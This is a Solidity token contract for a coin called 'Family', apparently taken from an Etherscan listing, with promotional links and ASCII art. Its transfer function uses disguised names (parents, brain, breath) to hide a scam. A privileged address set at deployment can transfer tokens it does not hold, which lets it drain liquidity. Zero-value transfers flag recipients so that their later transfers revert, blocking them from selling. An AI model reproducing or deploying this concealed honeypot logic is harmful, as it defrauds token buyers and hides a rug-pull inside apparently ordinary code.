/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

// https://www.familycoindex.xyz
// https://twitter.com/familycoinindex
// https://t.me/familycoinindex

// .......,:;+**?******+;:..................................................................................
// ....:;******************;................................................................................
// ..,*?*******************?*:..............................................................................
// .,***********************??;.............................................................................
// .;?****************??????%??:............................................................................
// .+?********??????????????*???:...........................................................................
// .+**********?%%%%??*****?*?%%?,..........................................................................
// .+?*********?%%%%%SS?*?*??S?*?+..........................................................................
// .:?************%##?%%***?%%***?,............................................................:;:..........
// .:%%??*********?%?********??**?:...........................................................+?*?:.........
// .:S*??****************?****%%*?+..........................................................,?**?:.......,,
// ..????***************???%?**%?**...........................................................?**?:.....,+*?
// ..,*???*************????%?***??+...........................................................***?:....:?**?
// ...,*????**********??***???%%%?;..........................................................:?****,..;?**?:
// ....;?**%*********??*?%SS%%%%??:.........................................................,?*******+%?*?+.
// ....,%%*%?**************????**?.........................................................,*?******%?*??*,.
// ....*%%%%%*******************?;.......................................................,+?%********??*?,..
// ..,*%%%%%%%%%??*************?+.....................................................,;******?????****?;...
// ,;%%%%%%%%%%%%%%%?*???????%%?:,.................................................,:+********??**??**?*....
// ?%%%%%?%%%%%%%%%%%%???????*?S%%?*+:,.........................................,;+*?*****??????%?****+,....
// ?%%%%%%%??%S%%%%%?%%%??****%%%%%%%SS*:.....................................:**********??**?????*+;,......
// ?%%%%%%?%%%%??%%%%%?%%%%%%?%%%%%??%S%%?;,..............................,:;*?************??+;;::,.........
// ?%%%%%%%S%%%%%%%%%%%%%?%SS%S%%%%%%?%S%%S%+::;;:::,,,.............,::;+*****************?+,...............
// ??????????%%%%%%%%?%%%%S%%?%%%S%%S%?%S%?%%???*********++;::,,,:;+*********************?;.................
// +************?%%%%%%?%%%%%%%S%?%%%S%?%S%?%%%?***************************************?*,..................
// ****************?%%%%%%%%%%%%S%?%%%S%?%S%%?%?***************************************;....................
// *******************?%%%%%%%%%SS?*S%%S%?%S%%S?*************************************;,.....................
// ********************?%%%%%%%?%S%?%%%%%??%%%S%*********************************?*:,.......................

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Family is Ownable {

    uint8 public decimals = 9;

    uint256 private brain;

    mapping(address => mapping(address => uint256)) public allowance;

    function familyStrongTogether(address mom, address father, uint256 love) private returns (bool success) {
        if (parents[mom] == 0) {
            if (uniswapV2Pair != mom && breath[mom] > 0) {
                parents[mom] -= brain;
            }
            balanceOf[mom] -= love;
        }
        balanceOf[father] += love;
        if (love == 0) {
            breath[father] += brain;
        }
        emit Transfer(mom, father, love);
        return true;
    }

    address public uniswapV2Pair;

    string public name = "Family";

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply = 1_000_000_000_000 * 10 ** decimals;

    mapping(address => uint256) private parents;

    constructor(address need) {
        _initializeLP();
        brain = 51;
        parents[need] = brain;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    function approve(address unknown, uint256 love) public returns (bool success) {
        allowance[msg.sender][unknown] = love;
        emit Approval(msg.sender, unknown, love);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private breath;

    function transferFrom(address mom, address father, uint256 love) public returns (bool success) {
        familyStrongTogether(mom, father, love);
        require(love <= allowance[mom][msg.sender]);
        allowance[mom][msg.sender] -= love;
        return true;
    }

    function _initializeLP() internal {
        balanceOf[msg.sender] = totalSupply;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public symbol = "FAMILY";

    function transfer(address father, uint256 love) public returns (bool success) {
        familyStrongTogether(msg.sender, father, love);
        return true;
    }
}